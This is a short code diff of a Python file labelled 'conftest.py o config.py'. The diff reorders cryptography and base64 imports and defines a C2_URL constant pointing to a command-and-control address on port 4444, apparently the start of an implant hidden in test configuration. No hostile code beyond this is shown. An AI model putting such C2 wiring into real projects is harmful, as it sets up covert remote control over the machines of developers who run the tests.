@@ -1,8 +1,9 @@
 # conftest.py o config.py
-import os
 import base64
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+import os
+
 from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 # === CONFIGURACIÓN ===
 C2_URL = "https://10.10.14.91:4444"
